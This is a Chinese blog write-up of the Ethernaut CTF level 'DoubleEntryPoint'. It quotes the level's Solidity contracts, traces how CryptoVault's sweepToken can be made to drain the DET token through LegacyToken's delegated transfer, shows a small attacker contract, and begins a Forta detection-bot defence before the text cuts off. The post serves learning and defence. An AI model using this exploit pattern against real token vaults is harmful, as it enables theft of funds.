@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      26.DoublicEntryPoint 
+      
+      
+      |
+    
+     Sec Life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">26.DoublicEntryPoint</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-07-19 15:26:29
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/04-Ethernaut-CTF/" title="04.Ethernaut CTF">
+                    <b>#</b> 04.Ethernaut CTF
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DoublicEntryPoint"><a href="#DoublicEntryPoint" class="headerlink" title="DoublicEntryPoint"></a>DoublicEntryPoint</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：找到CryptoVault中的bug，用玩家EOA账户创建Forta机器人，进行防御而不是攻击。注意，需要在被攻击之前设置好机器人以完成题目，也就是说，不能你尝试攻击成功后再做防御。因此，你在测试过可以攻击后，要重新生成一个instance，然后直接防御。我猜题目的检测机制是看看能不能攻击成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface DelegateERC20 &#123;</span><br><span class="line">  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Forta is IForta &#123;</span><br><span class="line">  mapping(address =&gt; IDetectionBot) public usersDetectionBots;</span><br><span class="line">  mapping(address =&gt; uint256) public botRaisedAlerts;</span><br><span class="line"></span><br><span class="line">  function setDetectionBot(address detectionBotAddress) external override &#123;</span><br><span class="line">      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function notify(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">    if(address(usersDetectionBots[user]) == address(0)) return;</span><br><span class="line">    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125; catch &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function raiseAlert(address user) external override &#123;</span><br><span class="line">      if(address(usersDetectionBots[user]) != msg.sender) return;</span><br><span class="line">      botRaisedAlerts[msg.sender] += 1;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CryptoVault &#123;</span><br><span class="line">    address public sweptTokensRecipient;</span><br><span class="line">    IERC20 public underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address recipient) &#123;</span><br><span class="line">        sweptTokensRecipient = recipient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setUnderlying(address latestToken) public &#123;</span><br><span class="line">        require(address(underlying) == address(0), &quot;Already set&quot;);</span><br><span class="line">        underlying = IERC20(latestToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    ...</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    function sweepToken(IERC20 token) public &#123;</span><br><span class="line">        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);</span><br><span class="line">        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;</span><br><span class="line">    DelegateERC20 public delegate;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;</span><br><span class="line">        delegate = newContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">        if (address(delegate) == address(0)) &#123;</span><br><span class="line">            return super.transfer(to, value);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;</span><br><span class="line">    address public cryptoVault;</span><br><span class="line">    address public player;</span><br><span class="line">    address public delegatedFrom;</span><br><span class="line">    Forta public forta;</span><br><span class="line"></span><br><span class="line">    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;</span><br><span class="line">        delegatedFrom = legacyToken;</span><br><span class="line">        forta = Forta(fortaAddress);</span><br><span class="line">        player = playerAddress;</span><br><span class="line">        cryptoVault = vaultAddress;</span><br><span class="line">        _mint(cryptoVault, 100 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyDelegateFrom() &#123;</span><br><span class="line">        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier fortaNotify() &#123;</span><br><span class="line">        address detectionBot = address(forta.usersDetectionBots(player));</span><br><span class="line"></span><br><span class="line">        // Cache old number of bot alerts</span><br><span class="line">        uint256 previousValue = forta.botRaisedAlerts(detectionBot);</span><br><span class="line"></span><br><span class="line">        // Notify Forta</span><br><span class="line">        forta.notify(player, msg.data);</span><br><span class="line"></span><br><span class="line">        // Continue execution</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        // Check if alarms have been raised</span><br><span class="line">        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateTransfer(</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        address origSender</span><br><span class="line">    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">        _transfer(origSender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>题目看起来挺复杂，别被吓到（好吧我已经被吓到了:fearful:），走流程分析。</p>
+<p>我们第一步要看看这个题目都有些啥合约，根据名字、继承关系和题目描述，我们可以推断他们的大概职责：</p>
+<ul>
+<li>LegacyToken(LGT)，DoubleEntryPoint(DET)：两个ERC20代币合约</li>
+<li>CryptoVault：金库合约</li>
+<li>Forta：报警机器人，任何人都可以在这里注册机器人，然后检测其他合约，交易异常则发出报警</li>
+</ul>
+<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2.详细分析"></a>2.详细分析</h3><p>知道了各个合约的职责，我们就要详细分析每个合约干了些什么。通常顺序是先看方法名理解会做啥事情，然后再具体分析代码逻辑</p>
+<ul>
+<li><p>LegacyToken(LGT)</p>
+<ul>
+<li>重写了transfer<ul>
+<li>如果delagate地址没有设置，或者设为0，则正常调用ERC20标准的transfer</li>
+<li>如果delagate设置为其他值，则调用delegate的<code>delegateTransfer()</code>方法。本题中，delegate是DoubleEntryPoint合约，因此只会走这里而不会调用ERC20标准的transfer</li>
+</ul>
+</li>
+<li>只有onwer可以修改delagate</li>
+</ul>
+</li>
+<li><p>DoubleEntryPoint(DET)</p>
+<ul>
+<li>初始化所有变量，然后mint 100 个DET给CryptoVault(金库)</li>
+<li>onlyDelegateFrom修饰的方法只可以由delegatedFrom调用，也就是LegacyToken(LGT)</li>
+<li>fortaNotify：用于报警机器人，首先获取报警机器人之前报警的次数，执行报警机器人的<code>norify()</code>，也就是让报警机器人执行<code>handleTransaction()</code>来处理这笔交易。然后执行被修饰的方法。如果这笔交易将会发生警报，那么将会增加报警的次数，一旦新的报警次数大于之前的（也就是说这次交易发生了报警嘛），就将这笔交易revert</li>
+<li><code>delegateTransfer()</code>只能由LegacyToken(LGT)合约调用，并且fortaNotify充当报警机器人进行监控，如果发生报警则交易revert。如果一切顺利，我们将调用<code>_transfer()</code>方法将DET代币转移</li>
+</ul>
+</li>
+<li><p>CryptoVault(金库)</p>
+<ul>
+<li><p>这个合约有bug，我们需要做的不是攻击，而是帮助这个合约进行防御</p>
+</li>
+<li><p>持有100个DET和LGT代币</p>
+</li>
+<li><p><code>setUnderlying()</code>设置底层代币地址，并且只能设置一次，也就是DoubleEntryPoint(DET)，因为题目说了：</p>
+<blockquote>
+<p>The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it.</p>
+</blockquote>
+</li>
+<li><p><code>sweepToken()</code>在确保要被转移的代币不是DET的情况下，将本合约中的此token所有余额转移到sweptTokensRecipient中。当然sweptTokensRecipient我们无法修改。</p>
+</li>
+</ul>
+</li>
+<li><p>Forta(报警机器人)</p>
+<ul>
+<li>用于监控，检测DeFi、NFT、DAO、跨链桥等</li>
+<li><code>setDetectionBot()</code>方法，任何人都可以实现一个报警机器人（需要实现相应的方法），然后注册到本合约Forta中使用。</li>
+<li><code>raiseAlert()</code>增加报警次数</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-寻找漏洞"><a href="#3-寻找漏洞" class="headerlink" title="3.寻找漏洞"></a>3.寻找漏洞</h3><p>要找到漏洞，要看看现在我们拥有什么。题目给我们的instance是DET合约，这个可以通过到<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/DoubleEntryPointFactory.sol">github仓库</a>得知：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createInstance(address _player) override public payable returns (address) &#123;</span><br><span class="line">	....</span><br><span class="line">    DoubleEntryPoint newToken = new DoubleEntryPoint(address(oldToken), address(vault), address(forta), _player);</span><br><span class="line">	......</span><br><span class="line">    return address(newToken);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>然后拿着这个instance地址，查看slot情况，我们遍历前15个slot，结果如下。因为DET继承了好几个合约，继承的slot是按顺序往下排的，因此他本身的四个变量的slot是6~9。并且CryptoVault是slot 6。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Address] 0x494Cb524120F5EFFbA2a8430F8d41aB6AcbF11A1 (DET)</span><br><span class="line">[Slot 0] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 1] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 2] 0x0000000000000000000000000000000000000000000000056bc75e2d63100000</span><br><span class="line">[Slot 3] 0x446f75626c65456e747279506f696e74546f6b656e000000000000000000002a</span><br><span class="line">[Slot 4] 0x4445540000000000000000000000000000000000000000000000000000000006</span><br><span class="line">[Slot 5] 0x0000000000000000000000009451961b7aea1df57bc20cc68d72f662241b5493</span><br><span class="line">[Slot 6] 0x0000000000000000000000002afe0c3dc3a9cf42a0b0cf6ace3e00d6c4ce66d5 // CryptoVault,此合约中包含DET</span><br><span class="line">[Slot 7] 0x000000000000000000000000d3e65149c212902749d49011b6ab24bba30d97c6 // player</span><br><span class="line">[Slot 8] 0x00000000000000000000000012cae34400598ab6afc58b670a1a1e80cdbdaf78 // delegatedFrom(LGT)</span><br><span class="line">[Slot 9] 0x0000000000000000000000005dfa1e4e8c1f4a3f88ff2ed3a12e92d3c8129ea9 // forta</span><br><span class="line">[Slot 10] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 11] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 12] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 13] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">[Slot 14] 0x0000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
+<p>我们看看slot 6 CryptoVault在Etherscan的资产情况，确实拥有DET和LGT各100个</p>
+<p><img src="https://moe.photo/images/2023/07/19/image-20230719164823560.png" alt></p>
+<p>因为金库CryptoVault中的<code>sweepToken()</code>除了无法提取底层代币，其他的代币都可以提取。那么理论上任何人都可以提取LGT这个代币，而无法提取DET这个底层代币，这也是业务的期望逻辑。但是这就是问题就在这里，我们可以把底层代币DET提取出来。</p>
+<p>攻击方法是调用CryptoVault的<code>sweepToken()</code>，攻击思路如下：</p>
+<p>1.在CryptoVault合约中调用sweepToken( LGT )，可以调用成功因为传参不是DET</p>
+<p>2.在LGT合约中，会调用到<code>transfer()</code>。这不是<code>transfer()</code>的标准实现，这种魔改的方法往往会有问题。因为LGT合约中已经设置过delegate了，为DET，因此会走到else语句中。注意，这里的msg.sender是CryptoVault。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">    if (address(delegate) == address(0)) &#123;</span><br><span class="line">    return super.transfer(to, value);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>3.然后会程序流会跳转到DET合约的<code>delegateTransfer()</code>方法，然后进行转账。因为没有设置机器人来报警，因此会被转走代币。</p>
+<p>4.这样，我们就在CryptoVault偷走DET！</p>
+<p><img src="https://moe.photo/images/2023/07/19/image-20230719174622591.png" alt></p>
+<p>攻击代码可以是如下。将题目instance地址传入，然后调用<code>attack_stealDET()</code>即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address) external;</span><br><span class="line">    function notify(address , bytes calldata ) external;</span><br><span class="line">    function raiseAlert(address ) external;</span><br><span class="line">&#125;//报警机器人</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address, bytes calldata ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ICryptoVault&#123;</span><br><span class="line">    function sweepToken(address) external;</span><br><span class="line">    function underlying() external view returns(address);</span><br><span class="line">&#125; // 金库</span><br><span class="line"></span><br><span class="line">interface ILegacyToken &#123; &#125; // 垃圾币</span><br><span class="line"></span><br><span class="line">interface IDoubleEntryPoint &#123;</span><br><span class="line">    function cryptoVault() external view returns(address);</span><br><span class="line">    function delegatedFrom() external view returns(address);</span><br><span class="line">    function forta() external view returns(address);</span><br><span class="line">&#125; // 底层币</span><br><span class="line"></span><br><span class="line">// 1. 获取一个实例，尝试是否可以攻击成功</span><br><span class="line">contract attaker&#123;</span><br><span class="line">    IDoubleEntryPoint instance; // 题目实例</span><br><span class="line">    IForta forta; // 报警机器人</span><br><span class="line">    IDoubleEntryPoint DET; // 底层币</span><br><span class="line">    ILegacyToken LGT; // 垃圾币</span><br><span class="line">    ICryptoVault vault; // 金库</span><br><span class="line"></span><br><span class="line">    constructor(IDoubleEntryPoint _addr) public &#123;</span><br><span class="line">        // 初始化题目信息</span><br><span class="line">        instance = _addr;</span><br><span class="line">        vault = ICryptoVault(instance.cryptoVault());</span><br><span class="line">        DET = IDoubleEntryPoint(vault.underlying());</span><br><span class="line">        LGT = ILegacyToken(instance.delegatedFrom());</span><br><span class="line">        forta = IForta(instance.forta());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_stealDET() public &#123; // 2.我们来尝试一下是否可以攻击成功</span><br><span class="line">        vault.sweepToken(address(LGT));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="4-做出防御"><a href="#4-做出防御" class="headerlink" title="4.做出防御"></a>4.做出防御</h3><p>那么，我们就大概知道了攻击逻辑：当调用跳转到LGT合约的时候，又会让CryptoVault跳转到DET，并调用DET时的msg.sender是CryptoVault。这样就实现了偷钱。因此，我们的防御思路就是在调用DET的转账方法的时候，设置一个报警机器人，让它来检查LGT的<code>transfer()</code>第三个参数msg.sender是不是CryptoVault即可，是则报警（也就是将报警数量+1，调用<code>raiseAlert()</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return delegate.delegateTransfer(to, value, msg.sender);</span><br></pre></td></tr></table></figure>
+<p>那么如何找到第三个参数msg.sender呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">     if (address(delegate) == address(0)) &#123;</span><br><span class="line">         return super.transfer(to, value);</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function delegateTransfer(</span><br><span class="line">     address to,</span><br><span class="line">     uint256 value,</span><br><span class="line">     address origSender</span><br><span class="line"> ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">     _transfer(origSender, to, value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function notify(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">     if(address(usersDetectionBots[user]) == address(0)) return;</span><br><span class="line">     try usersDetectionBots[user].handleTransaction(user, msgData) &#123;</span><br><span class="line">         return;</span><br><span class="line">     &#125; catch &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>handleTransaction()传入的calldata如下：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>长度</th>
+<th>offset</th>
+<th>变量类型</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4 bytes</td>
+<td>0x0</td>
+<td>bytes4</td>
+<td>函数选择器handleTransaction(address,bytes)：0x220ab6aa</td>
+</tr>
+<tr>
+<td>32 bytes</td>
+<td>0x4</td>
+<td>address</td>
+<td>user</td>
+</tr>
+<tr>
+<td>32 bytes</td>
+<td>0x24</td>
+<td>uint256</td>
+<td>Offset of <code>msgData</code></td>
+</tr>
+<tr>
+<td>32 bytes</td>
+<td>0x44</td>
+<td>uint256</td>
+<td>Length of <code>msgData</code></td>
+</tr>
+<tr>
+<td>4 bytes</td>
+<td>0x64</td>
+<td>bytes4</td>
+<td>函数选择器delegateTransfer(address,uint256,address)：0x9cd1a121</td>
+</tr>
+<tr>
+<td>32 bytes</td>
+<td>0x68</td>
+<td>address</td>
+<td>to</td>
+</tr>
+<tr>
+<td>32 bytes</td>
+<td>0x88</td>
+<td>uint256</td>
+<td>value</td>
+</tr>
+<tr>
+<td>32 bytes</td>
+<td>0xA8</td>
+<td>address</td>
+<td>msg.sender</td>
+</tr>
+<tr>
+<td>28 bytes</td>
+<td>0xC8</td>
+<td>bytes</td>
+<td>补0</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>我们需要判断的msg.sender位于calldata的0xA8之后的32字节，因此我们用内联汇编取出来判断即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calldataload(0xa8)</span><br></pre></td></tr></table></figure>
+<p>完整的报警机器人实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 3. 部署一个MyRobot</span><br><span class="line">contract MyRobot is IDetectionBot &#123;</span><br><span class="line">    ICryptoVault vault;</span><br><span class="line"></span><br><span class="line">    constructor(ICryptoVault _addr) public &#123;</span><br><span class="line">        vault = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line"></span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender := calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender == address(vault)) &#123;</span><br><span class="line">            